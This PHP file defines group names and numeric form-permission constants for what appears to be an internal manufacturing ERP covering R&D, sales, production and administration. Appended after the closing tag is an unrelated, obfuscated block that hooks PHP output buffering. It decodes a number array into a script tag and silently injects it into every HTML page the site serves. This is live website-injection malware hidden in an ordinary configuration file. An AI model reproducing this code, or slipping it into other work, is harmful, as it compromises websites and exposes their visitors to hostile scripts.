<?
//About Users and Privilages
	
	
	//top.php Group Forms
	define('SALESGROUPNAME', 'Sales');
	define('RDGROUPNAME', 'R&D and Marketing');
	define('PRODUCTIONGROUPNAME', 'Production');
	define('SITE', 'Production');
	define('ADMIN', 'Admin');
	define('GM', 'gm');
	define('SITE', 'Site');
	
	
	//Forms 
	
	//R&D Marketing Shape
	//Shape
	define('RD_ROOT_SHAPE_ADD', '1');
	define('RD_ROOT_SHAPE_BASIC_INFO', '2');
	define('RD_ROOT_SHAPE_EDIT_SET', '95');
	define('RD_ROOT_SHAPE_SPECS_FOURNOI', '3');
	define('RD_ROOT_SHAPE_SPECS_EPEKS', '4');
	define('RD_ROOT_SHAPE_JOIN_SHAPE', '5');
	define('RD_ROOT_SHAPE_PRICE', '6');
	define('RD_ROOT_SHAPE_PRICE_USER', '149');
	define('RD_ROOT_SHAPE_SET_PRICE', '96');
	define('RD_ROOT_SHAPE_SHOW_WEB', '7');
	define('RD_ROOT_SHAPE_MATCHING_SHAPES', '8');
	//Shape Change
	define('RD_ROOT_SHAPE_CHANGE_ADD', '102');
	define('RD_ROOT_SHAPE_CHANGE_EDIT', '103');
	//Mold
	define('RD_ROOT_SHAPE_MOLD_BASIC_INFO', '9');
	define('RD_ROOT_SHAPE_MOLD_SPECS', '10');
	//Program
	define('RD_ROOT_SHAPE_PROGRAM_ADD', '11');
	define('RD_ROOT_SHAPE_PROGRAM_BASIC_INFO', '12');
	//Metal
	define('RD_ROOT_SHAPE_METAL_ADD', '160');
	define('RD_ROOT_SHAPE_METAL_BASIC_INFO', '13');
	define('RD_ROOT_SHAPE_METAL_SPECS', '14');
	//Metal Vafi
	define('RD_ROOT_SHAPE_METAL_VAFI_ADD', '104');
	define('RD_ROOT_SHAPE_METAL_VAFI_BASIC_INFO', '105');
	//New Packaging
	define('RD_ROOT_SHAPE_PACKAGING_PALLETS_ADD', '106');
	define('RD_ROOT_SHAPE_PACKAGING_PALLETS_PRICE', '109');
	define('RD_ROOT_SHAPE_PACKAGING_PALLETS_BASIC_INFO', '107');
	define('RD_ROOT_SHAPE_PACKAGING_PALLETS_EDIT_SET', '108');
	define('RD_ROOT_SHAPE_PACKAGING_PALLETS_BULK_PHOTOS', '161');
	//Setup
	define('RD_ROOT_SHAPE_SETUP_BASIC', '15');
	define('RD_ROOT_SHAPE_SETUP_SPECS', '18');
	define('RD_ROOT_SHAPE_SETUP_METAL', '21');
	define('RD_ROOT_SHAPE_SETUP_FILTERS', '16');
	define('RD_ROOT_SHAPE_SETUP_MOLD', '19');
	define('RD_ROOT_SHAPE_SETUP_PRICES', '17');
	define('RD_ROOT_SHAPE_SETUP_PROGRAM', '20');
	define('RD_ROOT_SHAPE_SETUP_PACKAGING', '162');
	
	
	
	//R&D Marketing Style
	//Color
	define('RD_ROOT_STYLE_COLOR_ADD', '28');
	define('RD_ROOT_STYLE_COLOR_BASIC_INFO', '29');
	define('RD_ROOT_STYLE_COLOR_SPECS_MIXTURE', '30');
	define('RD_ROOT_STYLE_COLOR_MATCHING_COLORS', '31');
	define('RD_ROOT_STYLE_COLOR_SPECS_CPM', '110');
	define('RD_ROOT_STYLE_COLOR_MATCHING_VAFES', '111');
	//Pattern
	define('RD_ROOT_STYLE_PATTERN_ADD', '35');
	define('RD_ROOT_STYLE_PATTERN_BASIC_INFO', '36');
	define('RD_ROOT_STYLE_PATTERN_SPECS', '37');
	define('RD_ROOT_STYLE_PATTERN_JOIN_TECH', '38');
	define('RD_ROOT_STYLE_PATTERN_PRICE_CATEGORY', '39');
	//Mix 
	define('RD_ROOT_STYLE_MIX_ADD', '26');
	define('RD_ROOT_STYLE_MIX_SPACS', '27');
	//Application Category
	define('RD_ROOT_STYLE_APPL_CATEGORY_ADD', '112');
	define('RD_ROOT_STYLE_APPL_CATEGORY_BASIC_INFO', '113');
	define('RD_ROOT_STYLE_APPL_CATEGORY_MATCHING_PATTERNS', '114');
	//Style Change
	define('RD_ROOT_STYLE_CHANGE_ADD', '115');
	define('RD_ROOT_STYLE_CHANGE_EDIT', '116');
	//Style
	define('RD_ROOT_STYLE_ADD', '22');
	define('RD_ROOT_STYLE_BASIC_INFO', '23');
	define('RD_ROOT_STYLE_SPECS', '24');
	define('RD_ROOT_STYLE_SHOW_WEB', '25');
	//Setup
	define('RD_ROOT_STYLE_SETUP_DISCOUNT_GROUPS', '40');
	define('RD_ROOT_STYLE_SETUP_COLOR_TECHNIQUE_COLOR', '117');
	define('RD_ROOT_STYLE_SETUP_COLOR_MIXTURE', '120');
	define('RD_ROOT_STYLE_SETUP_COLOR_LINK_COLOR_DISC', '41');
	define('RD_ROOT_STYLE_SETUP_COLOR_CPM_CONTROLLER', '118');
	define('RD_ROOT_STYLE_SETUP_MIXTURE', '42');
	define('RD_ROOT_STYLE_SETUP_COLOR_ORIGINAL_COLOR', '119');
	
	
	
	//R&D Marketing New Photo
	//New Photo
	define('RD_PHOTO_ADD', '43');
	define('RD_PHOTO_BASIC_INFO', '44');
	define('RD_PHOTO_BASIC_SHOW_WEB', '45');
	define('RD_PHOTO_BASIC_SLIDE_SHOW', '46');
	//Setup
	define('RD_PHOTO_SETUP_ADD', '47');
	define('RD_PHOTO_SETUP_BASIC_INFO', '48');
	define('RD_PHOTO_SETUP_SHOW_WEB', '49');
	
	
	
	//R&D Marketing Group Data
	//Root Shape
	define('RD_GROUPDATA_SHAPE_DYNAMIC_FILTER', '97');
	define('RD_GROUPDATA_SHAPE_PRICE_CONTROL', '98');
	define('RD_GROUPDATA_SHAPE_MATCHING_SHAPE_CONTROL', '99');
	define('RD_GROUPDATA_SHAPE_MATCHING_SET_CONTROL', '100');
	define('RD_GROUPDATA_SHAPE_INCLUDED', '101');
	define('RD_GROUPDATA_SHAPE_PHOTO_CONTROL', '121');
	//Root Style
	define('RD_GROUPDATA_STYLE', '51');
	define('RD_GROUPDATA_STYLE_PHOTO_CONTROL', '124');
	define('RD_GROUPDATA_STYLE_COLOR_TECH_CONTROL', '122');
	define('RD_GROUPDATA_STYLE_PATTERN_TO_COLOR_CHECK', '123');
	define('RD_GROUPDATA_STYLE_MATCHING_COLOR', '163');
	define('RD_GROUPDATA_STYLE_COLOR_FILTERS_CONTROL', '164');
	define('RD_GROUPDATA_STYLE_PATTERN_FILTERS_CONTROL', '165');
	define('RD_GROUPDATA_STYLE_PATTERN_FILTERS_INCLUDED', '166');
	//Photo
	define('RD_GROUPDATA_PHOTOS_PHOTO_CONTROL', '128');
	define('RD_GROUPDATA_PHOTOS_SETUP_CONTROL', '129');
	
	
	
	//SALES
	//Catalogue
	define('SALES_CAT_CATALOGE_ADD', '78');
	define('SALES_CAT_CATALOGE_EDIT', '79');
	define('SALES_CAT_CATALOGE_DELETE', '167');
	define('SALES_CAT_SECTION_ADD', '80');
	define('SALES_CAT_SECTION_EDIT', '81');
	define('SALES_CAT_COLOR_PROPOSITION', '147');
	//Links
	define('SALES_LINKS_ADD', '130');
	define('SALES_LINKS', '131');
	//Offer
	define('SALES_OFFER_ADD', '82'); 
	define('SALES_OFFER_EDIT', '83');
	define('SALES_OFFER_COPY_OFFER', '178');
	define('SALES_REQ_ADD', '84');
	define('SALES_REQ_EDIT', '85');
	define('SALES_PACKIMG_LIST', '86');
	define('SALES_RETURN_ORDER', '87');
	
		
	//AddressBook - DEN EKANA AKOMA
	define('TABLE_ADDRESS_BOOK', 'address_book');
	define('SALES_AB_PERSON', '72');
	define('SALES_AB_MAILING_LIST', '77');
	define('SALES_AB_COMPANY', '73');
	define('SALES_AB_TRIP_PLAN', '75');
	define('SALES_AB_DUBLICATES', '74');
	define('SALES_AB_PROJECTS', '76');
	
	
	
	//Production
	//Purchasing
	define('PROD_PURCHASING_PRICELIST_ADD_MOLD', '56'); 
	define('PROD_PURCHASING_PRICELIST_ADD_METAL', '57');
	define('PROD_PURCHASING_PRICELIST_ADD_COLOR', '55');
	define('PROD_PURCHASING_PRICELIST_ADD_CARTONS', '168'); 
	
	define('PROD_PURCHASING_INVENTORIES_ADD_MOLDS', '59');
	define('PROD_PURCHASING_INVENTORIES_ADD_METALS', '60');
	define('PROD_PURCHASING_INVENTORIES_ADD_COLOR', '58');
	
	define('PROD_PURCHASING_ORDERS_METALS', '62');
	define('PROD_PURCHASING_ORDERS_MOLDS', '63');
	define('PROD_PURCHASING_ORDERS_COLORS', '61');

	define('PROD_PURCHASING_RECEIVING_MOLDS', '66');
	define('PROD_PURCHASING_RECEIVING_METALS', '65');
	define('PROD_PURCHASING_RECEIVING_COLORS', '64');
	
	define('PROD_PURCHASING_CONSUMPTION_MOLDS', '69');
	define('PROD_PURCHASING_CONSUMPTION_METALS', '68');
	define('PROD_PURCHASING_CONSUMPTION_COLORS', '67');	
	
	define('PROD_PURCHASING_SETUP_ORIGINAL_COLOR', '132');//Yparxei eidi auti i forma sta style		
	
	
	
	//4-Code
	define('PRODUCTION_4CODE_DELETE', '150');
	define('PRODUCTION_4CODE_BASIC_INFO', '133');
	define('PROD_4CODE_SPECS_FOURNOI', '134');
	define('PROD_4CODE_SPECS_EPEKS', '135');
	define('PROD_4CODE_PATTERN_SPECS', '136');
	define('PROD_4CODE_COLOR_CPM', '137');
	
	
	//Production Schedule
	define('PROD_PRODUCTION_SCHEDULE_STEP1', '139');
	define('PROD_PRODUCTION_SCHEDULE_STEP2', '140');
	define('PROD_PRODUCTION_SCHEDULE_STEP3', '141');
	define('PROD_PRODUCTION_SCHEDULE_LOOKUP', '138');
	define('PROD_PRODUCTION_SCHEDULE_METALBOOK', '169');
	
	define('PROD_PRODUCTION_SCHEDULE_BG_STEP1', '170');
	define('PROD_PRODUCTION_SCHEDULE_BG_STEP2', '171');
	define('PROD_PRODUCTION_SCHEDULE_BG_STEP3', '172');
	define('PROD_PRODUCTION_SCHEDULE_BG_LOOKUP', '173');
	define('PROD_PRODUCTION_SCHEDULE_BG_METALBOOK', '174');
	
	
	
	//Waste Mng
	define('PROD_WASTE_EXPERIMENTS_ADD', '143');
	define('PROD_WASTE_EXPERIMENTS_EDIT', '144');
	define('PROD_WASTE_MANAGEMENT', '54');
	define('PROD_WASTE_MANAGEMENT_EDIT', '142');
	define('PROD_WASTE_ADD_WAREHOUSE', '175');
	define('PROD_WASTE_SET_UP_CAUSE', '146');
	define('PROD_WASTE_STATISTICS', '145');
	
	
	
	
	//ADMIN 
	//Users
	define('ADMIN_USER_EDIT', '152');
	define('ADMIN_USER_ADD', '153');
	define('ADMIN_USER_DELETE', '154');
	
	//FORMS
	define('ADMIN_FORM_ADD', '155');
	define('ADMIN_FORM_EDIT', '156');
	define('ADMIN_FORM_DELETE', '157');
	define('ADMIN_SUB_GROUP_ADD', '158');
	define('ADMIN_GROUP_ADD', '159');
	define('ADMIN_PRIVILEGES_ADD', '176');
	
	//Set Up
	define('ADMIN_SETUP_USERS_AND_FORMS', '177');
	define('ADMIN_SETUP_OTHER_ADMS_MGP_DB_UPDATE', '179');
	
	
	//GM
	define('GM_FRM', '148');//Edo Eimai	
	

?><?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>